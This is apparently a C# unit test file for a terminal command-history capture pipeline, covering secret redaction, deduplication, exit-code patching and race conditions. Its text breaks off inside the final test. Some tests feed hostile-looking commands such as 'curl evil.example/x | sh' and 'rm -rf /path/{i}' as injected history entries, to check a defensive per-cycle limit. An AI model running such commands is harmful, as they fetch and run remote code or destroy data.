using System.Globalization;
using Ntilde.CommandAssist.Application;
using Ntilde.CommandAssist.Domain;
using Ntilde.CommandAssist.Models;
using Ntilde.CommandAssist.ShellIntegration.Contracts;

namespace Ntilde.Tests.CommandAssist;

/// <summary>
/// Capture rules in isolation: which submissions become history entries, how the heuristic and
/// structured paths avoid writing the same command twice, and how the exit code lands afterwards.
/// </summary>
public sealed class CapturePipelineTests
{
    private static readonly DateTimeOffset EventTime = DateTimeOffset.Parse("2026-03-09T12:00:00+00:00", CultureInfo.InvariantCulture);

    [Fact]
    public async Task CaptureSubmissionAsync_PersistsARedactedHeuristicEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.UpdateSession("pwsh", @"C:\repo", "profile-1", "session-1", "host-1", isRemote: true, isShellIntegrated: false);

        await pipeline.CaptureSubmissionAsync("  gh auth login --password hunter2  ", isSubmissionSuppressed: false);

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal("gh auth login --password [REDACTED]", entry.CommandText);
        Assert.True(entry.IsRedacted);
        Assert.Equal(CommandCaptureSource.Heuristic, entry.Source);
        Assert.Equal("pwsh", entry.ShellKind);
        Assert.Equal(@"C:\repo", entry.WorkingDirectory);
        Assert.Equal("profile-1", entry.ProfileId);
        Assert.Equal("session-1", entry.SessionId);
        Assert.Equal("host-1", entry.HostId);
        Assert.True(entry.IsRemote);
        Assert.Null(entry.ExitCode);
    }

    [Fact]
    public async Task CaptureSubmissionAsync_WhenShellKindIsUnknown_TagsTheEntryUnknown()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();

        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);

        Assert.Equal("unknown", Assert.Single(store.Entries).ShellKind);
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("echo one\necho two")]
    [InlineData("echo one\r\necho two")]
    public async Task CaptureSubmissionAsync_RejectsEmptyAndMultiLineSubmissions(string submission)
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();

        await pipeline.CaptureSubmissionAsync(submission, isSubmissionSuppressed: false);

        Assert.Empty(store.Entries);
    }

    [Fact]
    public async Task CaptureSubmissionAsync_WhenTheSubmissionIsSuppressed_CapturesNothing()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();

        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: true);

        Assert.Empty(store.Entries);
    }

    [Fact]
    public async Task CaptureSubmissionAsync_WhileTheAltScreenIsUp_CapturesNothing()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetAltScreenActive(true);

        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);

        Assert.Empty(store.Entries);
    }

    [Fact]
    public async Task CaptureSubmissionAsync_OnceStructuredCaptureIsProven_StandsDown()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        context.ObserveStructuredCommandCaptureMarker();

        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);

        Assert.Empty(store.Entries);
    }

    [Fact]
    public async Task CaptureSubmissionAsync_WhenTheStoreThrows_DoesNotPropagate()
    {
        var pipeline = new CapturePipeline(new ThrowingHistoryStore(), new SecretsFilter(), new AssistSessionContext());

        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);
    }

    [Fact]
    public async Task CompleteSubmissionAsync_PatchesTheExitCodeOfThePendingEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();
        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);

        await pipeline.CompleteSubmissionAsync(23);

        Assert.Equal(23, Assert.Single(store.Entries).ExitCode);
    }

    [Fact]
    public async Task CompleteSubmissionAsync_WithNothingPending_PatchesNothing()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();

        await pipeline.CompleteSubmissionAsync(1);

        Assert.Empty(store.PatchedEntryIds);
    }

    [Fact]
    public async Task CompleteSubmissionAsync_ConsumesThePendingEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();
        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);

        await pipeline.CompleteSubmissionAsync(0);
        await pipeline.CompleteSubmissionAsync(1);

        Assert.Single(store.PatchedEntryIds);
        Assert.Equal(0, Assert.Single(store.Entries).ExitCode);
    }

    [Fact]
    public async Task CommandAccepted_PersistsARedactedStructuredEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        await pipeline.HandleShellIntegrationEventAsync(Accepted("gh auth login --password hunter2", @"C:\from-event"));

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal("gh auth login --password [REDACTED]", entry.CommandText);
        Assert.Equal(CommandCaptureSource.ShellIntegration, entry.Source);
        Assert.Equal(EventTime, entry.ExecutedAt);
        Assert.Equal(@"C:\from-event", entry.WorkingDirectory);
    }

    /// <summary>
    /// V2 Phase 2b inverted this case. It used to assert "integration disabled means no structured
    /// capture", where "disabled" meant only "we did not inject a bootstrap" - which is permanently
    /// true of every SSH session, and would have made the remote snippets useless.
    /// </summary>
    /// <remarks>
    /// The event is its own evidence. An accepted-command event can only reach here from an armed
    /// <c>ShellLifecycleTracker</c>, and a tracker only ever fires from a parser mark callback: if
    /// this method is running, a shell emitted <c>OSC 133;C</c>. Who installed the thing that emitted
    /// it is not a fact the capture path needs.
    /// </remarks>
    [Fact]
    public async Task CommandAccepted_FromAShellWeDidNotInstrument_IsStillCaptured()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.UpdateSession("bash", "/home/u", "p", "s", "remote-host", isRemote: true, isShellIntegrated: false);

        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal("git status", entry.CommandText);
        Assert.Equal(CommandCaptureSource.ShellIntegration, entry.Source);
        Assert.True(entry.IsRemote);
        Assert.Equal("remote-host", entry.HostId);
        Assert.True(context.IsShellIntegrationLive);
    }

    [Fact]
    public async Task CommandAccepted_WhileTheAltScreenIsUp_CapturesNothing()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        context.SetAltScreenActive(true);

        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));

        Assert.Empty(store.Entries);
    }

    // ---- the textless C (V2 Phase 2b) ---------------------------------------------------------
    //
    // A `133;C` with no payload is legal FinalTerm and is what iTerm2's and VS Code's snippets
    // send. Phase 2b made the parser raise CommandAccepted for it with null text, so these four
    // tests are the contract for what the capture pipeline does with a lifecycle edge that carries
    // no command: everything except write an entry.

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public async Task CommandAccepted_WithNoCommandText_CapturesNothing(string? commandText)
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        await pipeline.HandleShellIntegrationEventAsync(Accepted(commandText));

        Assert.Empty(store.Entries);
    }

    /// <summary>
    /// It still proves the session is instrumented - that is the whole reason the parser raises it -
    /// but it must not prove the shell <em>reports command text</em>.
    /// </summary>
    /// <remarks>
    /// The distinction is the difference between a working session and a silent one. Standing the
    /// heuristic path down is what <c>HasObservedStructuredCommandCaptureMarker</c> does, and a shell
    /// that emits a bare C forever would then have the heuristic path off and the structured path
    /// producing nothing: no history at all, from a session that looks fully integrated.
    /// </remarks>
    [Fact]
    public async Task CommandAccepted_WithNoCommandText_ProvesInstrumentationButNotStructuredCapture()
    {
        (CapturePipeline pipeline, _, AssistSessionContext context) = CreatePipeline();

        await pipeline.HandleShellIntegrationEventAsync(Accepted(null));

        Assert.True(context.HasObservedShellIntegrationMarker);
        Assert.True(context.IsShellIntegrationLive);
        Assert.False(context.HasObservedStructuredCommandCaptureMarker);
        Assert.False(context.IsStructuredCaptureActive);
    }

    /// <summary>The consequence of the flag above: Enter-time capture keeps working.</summary>
    [Fact]
    public async Task CommandAccepted_WithNoCommandText_LeavesTheHeuristicPathRunning()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        await pipeline.HandleShellIntegrationEventAsync(Accepted(null));

        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);

        Assert.Equal(CommandCaptureSource.Heuristic, Assert.Single(store.Entries).Source);
    }

    /// <summary>
    /// The full bare-C cycle in order, which is the shape a third-party remote integration produces:
    /// the grid/heuristic path writes the entry at Enter, C arrives with nothing to add, and D
    /// patches the exit code and duration onto the entry that already exists.
    /// </summary>
    /// <remarks>
    /// The load-bearing part is that the textless C returns <em>before</em> touching the pending
    /// entry. Clearing it, or writing a second entry beside it, would leave D with nothing to patch
    /// and the command permanently recorded as still running.
    /// </remarks>
    [Fact]
    public async Task BareCCycle_CapturesOnceAndStillGetsItsExitCode()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        await pipeline.CaptureSubmissionAsync("dotnet test", isSubmissionSuppressed: false);
        await pipeline.HandleShellIntegrationEventAsync(Accepted(null));
        await pipeline.HandleShellIntegrationEventAsync(Finished(exitCode: 3, duration: TimeSpan.FromSeconds(2)));

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal("dotnet test", entry.CommandText);
        Assert.Equal(CommandCaptureSource.Heuristic, entry.Source);
        Assert.Equal(3, entry.ExitCode);
        Assert.Equal(2000, entry.DurationMs);
    }

    /// <summary>
    /// The first command of an instrumented session goes down both paths: the heuristic fires on
    /// Enter, and only then does the shell prove it reports command text. One entry must survive.
    /// </summary>
    [Fact]
    public async Task FirstCommandOfAnInstrumentedSession_IsCapturedOnceAndPatchedOnce()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);
        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));
        await pipeline.HandleShellIntegrationEventAsync(Finished(exitCode: 0, duration: TimeSpan.FromSeconds(1)));

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal(CommandCaptureSource.Heuristic, entry.Source);
        Assert.Equal(0, entry.ExitCode);
        Assert.Equal(1000, entry.DurationMs);
    }

    [Fact]
    public async Task SecondCommandOfAnInstrumentedSession_IsCapturedByTheStructuredPathOnly()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);
        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));
        await pipeline.HandleShellIntegrationEventAsync(Finished(0, TimeSpan.FromSeconds(1)));

        // The marker is now proven, so the heuristic stands down for everything that follows.
        await pipeline.CaptureSubmissionAsync("dotnet test", isSubmissionSuppressed: false);
        await pipeline.HandleShellIntegrationEventAsync(Accepted("dotnet test"));

        Assert.Equal(2, store.Entries.Count);
        Assert.Equal(CommandCaptureSource.ShellIntegration, store.Entries[1].Source);
    }

    [Fact]
    public async Task CommandAccepted_WhenTextDiffersFromThePendingHeuristicEntry_CapturesBoth()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        await pipeline.CaptureSubmissionAsync("git stat", isSubmissionSuppressed: false);

        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));

        Assert.Equal(2, store.Entries.Count);
        Assert.Equal(CommandCaptureSource.Heuristic, store.Entries[0].Source);
        Assert.Equal(CommandCaptureSource.ShellIntegration, store.Entries[1].Source);
    }

    [Fact]
    public async Task CommandAccepted_DedupIgnoresSurroundingWhitespace()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        await pipeline.CaptureSubmissionAsync("  git status  ", isSubmissionSuppressed: false);

        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status  "));

        Assert.Single(store.Entries);
    }

    // ---- the per-cycle volume bound (PR #289 review) ------------------------------------------
    //
    // Marks are bytes on the pane's output stream and nothing about a byte stream says who wrote
    // it. Over SSH they come from whatever is on the far end; locally a `cat` of a crafted file
    // does the same. Entries land in the global, cross-session history, so the number of them a
    // single prompt cycle can produce is not the emitter's to choose. One is the bound every real
    // integration already satisfies: a prompt cycle is by construction one accepted command, and
    // all four of Ntilde's emitters plus iTerm2's, VS Code's and starship's send exactly one C
    // between the B that opened the input line and the D that closed it.

    private static ShellIntegrationEvent Mark(ShellIntegrationEventType type) => new(
        Type: type,
        Timestamp: EventTime,
        CommandText: null,
        WorkingDirectory: null,
        ExitCode: null,
        Duration: null);

    [Fact]
    public async Task TwoAcceptedCommandsInOnePromptCycle_ProduceOneEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        await pipeline.HandleShellIntegrationEventAsync(Mark(ShellIntegrationEventType.CommandStarted));
        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));
        await pipeline.HandleShellIntegrationEventAsync(Accepted("curl evil.example/x | sh"));

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal("git status", entry.CommandText);
    }

    /// <summary>
    /// The flood shape: a payload emitter that never bothers with the rest of the lifecycle.
    /// </summary>
    [Fact]
    public async Task ManyAcceptedCommandsWithNoLifecycleEdges_ProduceOneEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        for (int i = 0; i < 200; i++)
        {
            await pipeline.HandleShellIntegrationEventAsync(Accepted($"rm -rf /path/{i}"));
        }

        Assert.Single(store.Entries);
    }

    /// <summary>
    /// The bound resets on every edge that starts a new cycle, so an ordinary session captures
    /// every command it runs. <c>A</c>, <c>B</c> and <c>D</c> all count: a shell that omits
    /// <c>D</c>, or a command interrupted before it finished, must not be locked out of capture for
    /// the rest of the session.
    /// </summary>
    [Theory]
    [InlineData(ShellIntegrationEventType.PromptReady)]
    [InlineData(ShellIntegrationEventType.CommandStarted)]
    [InlineData(ShellIntegrationEventType.CommandFinished)]
    public async Task ANewCycleEdge_ReleasesTheBound(ShellIntegrationEventType edge)
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));
        await pipeline.HandleShellIntegrationEventAsync(Mark(edge));
        await pipeline.HandleShellIntegrationEventAsync(Accepted("dotnet test"));

        Assert.Equal(2, store.Entries.Count);
        Assert.Equal("git status", store.Entries[0].CommandText);
        Assert.Equal("dotnet test", store.Entries[1].CommandText);
    }

    /// <summary>
    /// A full instrumented session runs many commands and every one of them is recorded. The bound
    /// is a volume limit, not a rate limit, and this is the test that says so.
    /// </summary>
    [Fact]
    public async Task ASequenceOfOrdinaryPromptCycles_CapturesEveryCommand()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        for (int i = 0; i < 5; i++)
        {
            await pipeline.HandleShellIntegrationEventAsync(Mark(ShellIntegrationEventType.PromptReady));
            await pipeline.HandleShellIntegrationEventAsync(Mark(ShellIntegrationEventType.CommandStarted));
            await pipeline.HandleShellIntegrationEventAsync(Accepted($"echo {i}"));
            await pipeline.HandleShellIntegrationEventAsync(Finished(0, TimeSpan.FromMilliseconds(10)));
        }

        Assert.Equal(5, store.Entries.Count);
        Assert.All(store.Entries, e => Assert.Equal(0, e.ExitCode));
    }

    /// <summary>
    /// The bound has to close over the dedup path too, or the cheapest way past it would be to
    /// repeat the command the heuristic path just wrote and then send the real payload.
    /// </summary>
    [Fact]
    public async Task AnAcceptedCommandThatDedupsAgainstTheHeuristicEntry_StillConsumesTheCycle()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);

        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));
        await pipeline.HandleShellIntegrationEventAsync(Accepted("curl evil.example/x | sh"));

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal("git status", entry.CommandText);
    }

    [Fact]
    public async Task CommandFinished_PatchesExitCodeAndRoundedDuration()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));

        await pipeline.HandleShellIntegrationEventAsync(Finished(7, TimeSpan.FromMilliseconds(2500.6)));

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal(7, entry.ExitCode);
        Assert.Equal(2501, entry.DurationMs);
    }

    [Fact]
    public async Task CommandFinished_WithoutAnAcceptedCommand_PatchesNothing()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        await pipeline.HandleShellIntegrationEventAsync(Finished(1, TimeSpan.FromMilliseconds(500)));

        Assert.Empty(store.Entries);
        Assert.Empty(store.PatchedEntryIds);
    }

    [Fact]
    public async Task CommandFinished_ConsumesThePendingEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));

        await pipeline.HandleShellIntegrationEventAsync(Finished(0, TimeSpan.FromSeconds(1)));
        await pipeline.HandleShellIntegrationEventAsync(Finished(9, TimeSpan.FromSeconds(2)));

        Assert.Single(store.PatchedEntryIds);
        Assert.Equal(0, Assert.Single(store.Entries).ExitCode);
    }

    [Theory]
    [InlineData(ShellIntegrationEventType.PromptReady, false)]
    [InlineData(ShellIntegrationEventType.CommandStarted, false)]
    [InlineData(ShellIntegrationEventType.CommandFinished, false)]
    [InlineData(ShellIntegrationEventType.CommandAccepted, true)]
    public async Task ObservedMarkers_OnlyCommandAcceptedProvesStructuredCapture(
        ShellIntegrationEventType type,
        bool expectsStructuredCapture)
    {
        (CapturePipeline pipeline, _, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        await pipeline.HandleShellIntegrationEventAsync(new ShellIntegrationEvent(
            Type: type,
            Timestamp: EventTime,
            CommandText: "git status",
            WorkingDirectory: null,
            ExitCode: null,
            Duration: null));

        Assert.True(context.HasObservedShellIntegrationMarker);
        Assert.Equal(expectsStructuredCapture, context.HasObservedStructuredCommandCaptureMarker);
        Assert.Equal(expectsStructuredCapture, context.IsStructuredCaptureActive);
    }

    [Fact]
    public async Task WorkingDirectoryChanged_UpdatesTheContextWithoutClaimingAMarker()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();

        await pipeline.HandleShellIntegrationEventAsync(new ShellIntegrationEvent(
            Type: ShellIntegrationEventType.WorkingDirectoryChanged,
            Timestamp: EventTime,
            CommandText: null,
            WorkingDirectory: "/new/place",
            ExitCode: null,
            Duration: null));

        Assert.Equal("/new/place", context.WorkingDirectory);
        Assert.False(context.HasObservedShellIntegrationMarker);
        Assert.Empty(store.Entries);
    }

    // ------------------------------------- UX-polish round: typos are flagged, never deleted

    /// <summary>
    /// Exit 127 is the POSIX shells' way of saying "no such command", and it is enough on its own.
    /// </summary>
    [Fact]
    public async Task CompleteSubmissionAsync_WhenTheExitCodeIs127_FlagsTheEntryAsAnInvalidCommand()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();
        await pipeline.CaptureSubmissionAsync("gti status", isSubmissionSuppressed: false);

        await pipeline.CompleteSubmissionAsync(127);

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.True(entry.IsInvalidCommand);

        // Flagged, not deleted: the record of what was run stays truthful.
        Assert.Equal("gti status", entry.CommandText);
        Assert.Equal(127, entry.ExitCode);
    }

    [Fact]
    public async Task CommandFinished_WhenTheExitCodeIs127_FlagsTheStructuredEntryToo()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        await pipeline.HandleShellIntegrationEventAsync(Accepted("gti status"));

        await pipeline.HandleShellIntegrationEventAsync(Finished(127, TimeSpan.FromMilliseconds(12)));

        Assert.True(Assert.Single(store.Entries).IsInvalidCommand);
    }

    [Theory]
    [InlineData(0)]
    [InlineData(1)]
    [InlineData(2)]
    public async Task CompleteSubmissionAsync_ForAnOrdinaryExitCode_DoesNotFlagTheEntry(int exitCode)
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();
        await pipeline.CaptureSubmissionAsync("git push", isSubmissionSuppressed: false);

        await pipeline.CompleteSubmissionAsync(exitCode);

        Assert.False(Assert.Single(store.Entries).IsInvalidCommand);
    }

    /// <summary>
    /// The PowerShell half: exit 1 tells us nothing, so the Fix recogniser's classification arrives
    /// afterwards and patches the entry the completion has already released.
    /// </summary>
    [Fact]
    public async Task MarkLastCommandInvalidAsync_AfterCompletion_FlagsTheEntryTheCompletionReleased()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();
        await pipeline.CaptureSubmissionAsync("gti status", isSubmissionSuppressed: false);
        await pipeline.CompleteSubmissionAsync(1);

        Assert.False(Assert.Single(store.Entries).IsInvalidCommand);

        await pipeline.MarkLastCommandInvalidAsync();

        Assert.True(Assert.Single(store.Entries).IsInvalidCommand);
    }

    /// <summary>
    /// With nothing completed there is no target, and a pending command is explicitly not one.
    /// </summary>
    [Fact]
    public async Task MarkLastCommandInvalidAsync_WithNothingCompleted_FlagsNothing()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();
        await pipeline.CaptureSubmissionAsync("gti status", isSubmissionSuppressed: false);

        await pipeline.MarkLastCommandInvalidAsync();

        Assert.False(Assert.Single(store.Entries).IsInvalidCommand);
    }

    /// <summary>
    /// A late classification may never land on a command the user has since run.
    /// </summary>
    /// <remarks>
    /// The failure mode this rules out is the worst one available: silently suppressing a command
    /// that works, because an analysis of the previous line arrived after the next had been typed.
    /// </remarks>
    [Fact]
    public async Task MarkLastCommandInvalidAsync_AfterANewCommandWasCaptured_FlagsNeitherEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();
        await pipeline.CaptureSubmissionAsync("gti status", isSubmissionSuppressed: false);
        await pipeline.CompleteSubmissionAsync(1);
        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);

        await pipeline.MarkLastCommandInvalidAsync();

        Assert.DoesNotContain(store.Entries, x => x.IsInvalidCommand);
    }

    /// <summary>
    /// The race the Enter-time append used to lose: a fast command's <c>D</c> is handled on the
    /// pane's shell-integration dispatcher while the heuristic append is still in flight on another
    /// queue. The finish must wait for the entry rather than find nothing pending and drop the exit
    /// code and duration.
    /// </summary>
    [Fact]
    public async Task CommandFinished_WhileTheHeuristicAppendIsInFlight_StillPatchesTheEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();
        TaskCompletionSource heldAppend = store.HoldAppends();

        Task capture = pipeline.CaptureSubmissionAsync("true", isSubmissionSuppressed: false);
        Task finish = pipeline.HandleShellIntegrationEventAsync(Finished(exitCode: 100, duration: TimeSpan.FromMilliseconds(3)));

        Assert.False(finish.IsCompleted, "The finish must wait for the append it patches.");
        Assert.Empty(store.Entries);

        heldAppend.SetResult();
        await capture;
        await finish;

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal(100, entry.ExitCode);
        Assert.Equal(3, entry.DurationMs);
    }

    /// <summary>
    /// The same race through the host's own command-finished signal.
    /// </summary>
    [Fact]
    public async Task CompleteSubmissionAsync_WhileTheHeuristicAppendIsInFlight_StillPatchesTheEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();
        TaskCompletionSource heldAppend = store.HoldAppends();

        Task capture = pipeline.CaptureSubmissionAsync("true", isSubmissionSuppressed: false);
        Task finish = pipeline.CompleteSubmissionAsync(23);

        heldAppend.SetResult();
        await capture;
        await finish;

        Assert.Equal(23, Assert.Single(store.Entries).ExitCode);
    }

    /// <summary>
    /// The double-capture guard has the same dependency: a <c>C</c> handled while the heuristic
    /// append for the same command is in flight must still recognise it, or the first command of an
    /// instrumented session is written twice.
    /// </summary>
    [Fact]
    public async Task CommandAccepted_WhileTheHeuristicAppendIsInFlight_IsStillDeduplicated()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        TaskCompletionSource heldAppend = store.HoldAppends();

        Task capture = pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);
        Task accepted = pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));

        heldAppend.SetResult();
        await capture;
        await accepted;
        await pipeline.HandleShellIntegrationEventAsync(Finished(exitCode: 0, duration: TimeSpan.FromSeconds(1)));

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal(CommandCaptureSource.Heuristic, entry.Source);
        Assert.Equal(0, entry.ExitCode);
        Assert.Equal(1000, entry.DurationMs);
    }

    /// <summary>
    /// The dedup only stands a <c>C</c> down once the heuristic entry has landed. A <c>C</c> that
    /// arrives while that append is in flight, and that append then fails, is the last record of the
    /// command: it must write its own entry, and the finish must patch that one.
    /// </summary>
    [Fact]
    public async Task CommandAccepted_WhileTheHeuristicAppendIsInFlightAndThenFails_WritesItsOwnEntry()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        TaskCompletionSource heldAppend = store.HoldAppends();

        Task capture = pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);
        Task accepted = pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));

        heldAppend.SetException(new InvalidOperationException("simulated write failure"));
        await capture;
        await accepted;
        await pipeline.HandleShellIntegrationEventAsync(Finished(exitCode: 2, duration: TimeSpan.FromMilliseconds(40)));

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal(CommandCaptureSource.ShellIntegration, entry.Source);
        Assert.Equal("git status", entry.CommandText);
        Assert.Equal(2, entry.ExitCode);
        Assert.Equal(40, entry.DurationMs);
    }

    /// <summary>
    /// A failed append can still have persisted the line - the real store writes it before it
    /// compacts, and a compaction failure throws after that. The <c>C</c> that replaces it must
    /// supersede that record rather than sit beside it as a duplicate with no exit code.
    /// </summary>
    [Fact]
    public async Task CommandAccepted_AfterAHeuristicAppendThatPersistedAndThenThrew_SupersedesIt()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        TaskCompletionSource heldAppend = store.HoldAppends(recordEvenIfItFails: true);

        Task capture = pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);
        Task accepted = pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));

        heldAppend.SetException(new InvalidOperationException("simulated compaction failure"));
        await capture;
        string heuristicId = Assert.Single(store.Entries).Id;
        await accepted;
        await pipeline.HandleShellIntegrationEventAsync(Finished(exitCode: 2, duration: TimeSpan.FromMilliseconds(40)));

        CommandHistoryEntry entry = Assert.Single(store.Entries);
        Assert.Equal(heuristicId, entry.Id);
        Assert.Equal(CommandCaptureSource.ShellIntegration, entry.Source);
        Assert.Equal(2, entry.ExitCode);
        Assert.Equal(40, entry.DurationMs);
    }

    /// <summary>
    /// The id takeover is for the matched command only. A <c>C</c> for a different command must not
    /// reuse the pending entry's id, or it would overwrite that entry.
    /// </summary>
    [Fact]
    public async Task CommandAccepted_ForADifferentCommand_NeverTakesOverThePendingEntryId()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);

        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);
        await pipeline.HandleShellIntegrationEventAsync(Accepted("git log"));

        Assert.Equal(2, store.Entries.Select(x => x.Id).Distinct().Count());
    }

    /// <summary>
    /// A finish waiting on an append that then fails must neither hang nor leave the failed
    /// registration in place for the dedup: the structured path writes its own entry.
    /// </summary>
    [Fact]
    public async Task CommandFinished_WaitingOnAnAppendThatFails_CompletesAndPatchesNothing()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
        context.SetShellIntegrationEnabled(true);
        TaskCompletionSource heldAppend = store.HoldAppends();

        Task capture = pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);
        Task finish = pipeline.HandleShellIntegrationEventAsync(Finished(exitCode: 0, duration: null));

        heldAppend.SetException(new InvalidOperationException("simulated write failure"));
        await capture;
        await finish;

        Assert.Empty(store.Entries);
        Assert.Empty(store.PatchedEntryIds);

